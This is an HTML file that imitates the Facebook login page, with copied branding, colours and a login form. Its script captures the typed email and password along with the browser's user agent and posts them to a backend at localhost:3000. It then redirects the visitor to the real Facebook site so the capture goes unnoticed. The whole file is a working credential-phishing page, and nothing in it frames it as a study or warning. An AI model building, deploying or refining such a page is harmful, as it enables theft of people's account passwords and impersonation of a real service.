<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background: #f0f2f5;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }
    .content {
      display: flex;
      flex-direction: row;
      max-width: 1000px;
      width: 100%;
      justify-content: space-between;
    }
    .text-section {
      flex: 1;
      padding-right: 50px;
    }
    .text-section h1 {
      color: #1877f2;
      font-size: 56px;
      margin-bottom: 10px;
    }
    .text-section p {
      font-size: 28px;
      color: #1c1e21;
    }
    .login-section {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      width: 360px;
    }
    .login-section input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
    }
    .login-section button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      border: none;
      font-size: 20px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }
    .login-section button:hover {
      background-color: #166fe5;
    }
    .login-section .link {
      display: block;
      text-align: center;
      margin-top: 12px;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }
    .login-section .link:hover {
      text-decoration: underline;
    }
    .create-account {
      background-color: #42b72a;
      margin-top: 20px;
    }
    .create-account:hover {
      background-color: #36a420;
    }
    @media (max-width: 768px) {
      .content {
        flex-direction: column;
        align-items: center;
      }
      .text-section {
        text-align: center;
        padding-right: 0;
        margin-bottom: 30px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="content">
      <div class="text-section">
        <h1>facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
      <div class="login-section">
        <form id="loginForm">
          <input type="text" id="email" placeholder="Email or phone number" required />
          <input type="password" id="password" placeholder="Password" required />
          <button type="submit">Log In</button>
          <a class="link" href="#">Forgot password?</a>
          <hr />
          <button class="create-account" type="button">Create New Account</button>
        </form>
      </div>
    </div>
  </div>

  <script>
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    fetch("http://localhost:3000/api/user-join", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email: email,
        password: password,
        joinedAt: new Date().toISOString(),
        userAgent: navigator.userAgent,
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        console.log("User joined:", data);
        // ✅ Redirect to Facebook profile link after form submission
        window.location.href = "https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=AfdhllWlSbakKgcTdpCcqp7p_T8jLTeYsFeKwxHDmu_PxHN7ow4dFhJCXeOkhMst6N0vCzH7b1Q6ydRtLlEDjeI4USIjFVapP2IegVGuo_x5wg&smuh=55287&lh=Ac87z1fG8rSls2NYZx4";
      })
      .catch((err) => console.error("Error:", err));
  });
</script>

  
</body>
</html>
